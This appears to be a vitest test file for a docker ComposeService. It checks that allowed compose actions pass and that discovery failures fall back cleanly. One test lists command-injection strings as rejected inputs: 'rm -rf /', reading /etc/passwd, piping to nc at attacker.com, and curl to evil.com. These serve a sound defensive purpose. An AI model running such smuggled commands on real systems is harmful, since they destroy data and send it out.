import { describe, it, expect, beforeEach, vi } from "vitest";
import { ComposeService } from "./compose.js";
import type { ISSHService, ILocalExecutorService } from "./interfaces.js";
import type { HostConfig } from "../types.js";
import type { ComposeDiscovery } from "./compose-discovery.js";

describe("ComposeService", () => {
  let ssh: ISSHService;
  let localExecutor: ILocalExecutorService;
  let service: ComposeService;

  beforeEach(() => {
    ssh = {
      executeSSHCommand: vi.fn().mockResolvedValue(""),
      getHostResources: vi.fn().mockResolvedValue({}) as never
    };
    localExecutor = {
      executeLocalCommand: vi.fn().mockResolvedValue("")
    };
    service = new ComposeService(ssh, localExecutor);
  });

  describe("action validation", () => {
    const host: HostConfig = { name: "test", host: "remote.example.com", protocol: "ssh" };

    it("allows valid compose actions", async () => {
      const validActions = ["up", "down", "ps", "logs", "build", "pull", "restart", "stop", "start"];

      for (const action of validActions) {
        await expect(service.composeExec(host, "proj", action)).resolves.toBeDefined();
      }
    });

    it("rejects action with shell metacharacters", async () => {
      const maliciousActions = [
        "up; rm -rf /",
        "up && cat /etc/passwd",
        "up | nc attacker.com 1234",
        "up $(curl evil.com)",
        "up `whoami`"
      ];

      for (const action of maliciousActions) {
        await expect(service.composeExec(host, "proj", action)).rejects.toThrow(/invalid.*action/i);
      }
    });

    it("rejects unknown compose actions", async () => {
      await expect(service.composeExec(host, "proj", "invalidaction123")).rejects.toThrow(/invalid.*action/i);
    });
  });

  it("executes compose commands via SSH service", async () => {
    const host: HostConfig = { name: "test", host: "remote.example.com", protocol: "ssh" };
    await service.composeExec(host, "proj", "ps");
    expect(ssh.executeSSHCommand).toHaveBeenCalled();
  });

  describe("discovery integration", () => {
    it("should use discovery to resolve compose file path", async () => {
      const host: HostConfig = { name: "test", host: "localhost", protocol: "local" };
      const mockDiscovery: ComposeDiscovery = {
        resolveProjectPath: vi.fn().mockResolvedValue("/compose/myproject/compose.yaml"),
        cache: {} as never,
      } as unknown as ComposeDiscovery;

      const serviceWithDiscovery = new ComposeService(ssh, localExecutor, mockDiscovery);

      await serviceWithDiscovery.composeExec(host, "myproject", "ps");

      // Should call discovery to resolve path
      expect(mockDiscovery.resolveProjectPath).toHaveBeenCalledWith(host, "myproject");

      // Should execute with -f flag pointing to discovered path
      expect(localExecutor.executeLocalCommand).toHaveBeenCalledWith(
        "docker",
        expect.arrayContaining(["-f", "/compose/myproject/compose.yaml"]),
        expect.anything()
      );
    });

    it("should fall back gracefully when discovery fails", async () => {
      const host: HostConfig = { name: "test", host: "localhost", protocol: "local" };
      const mockDiscovery: ComposeDiscovery = {
        resolveProjectPath: vi.fn().mockRejectedValue(new Error("Project not found")),
        cache: {} as never,
      } as unknown as ComposeDiscovery;

      const serviceWithDiscovery = new ComposeService(ssh, localExecutor, mockDiscovery);

      // Should not throw - should fall back to executing without -f flag
      await expect(serviceWithDiscovery.composeExec(host, "myproject", "ps")).resolves.toBeDefined();

      // Should still attempt to execute compose command (without -f flag)
      expect(localExecutor.executeLocalCommand).toHaveBeenCalledWith(
        "docker",
        expect.not.arrayContaining(["-f"]),
        expect.anything()
      );
    });
  });
});
